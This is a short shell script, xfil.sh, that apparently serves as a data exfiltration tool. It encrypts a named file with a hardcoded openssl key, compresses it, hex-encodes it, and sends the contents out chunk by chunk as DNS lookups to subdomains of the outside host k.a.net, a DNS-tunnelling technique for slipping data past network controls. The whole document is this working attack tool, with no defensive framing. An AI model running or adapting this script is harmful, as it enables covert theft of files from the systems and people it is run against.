#!/bin/sh

# this should be ran from the exfil point

#!/bin/sh

usage (){
  echo "USAGE: xfil.sh <file>"
  exit 1
}
if [ $1 ]; then	  
  openssl aes-256-cbc -in $1 -out $1.1 -k 1234
  tar -zcf $1.tgz $1.1
  xxd -p $1.tgz > $1.hex
  for dnsx in `cat $1.hex `; do dig $dnsx.k.a.net; done

else usage
fi
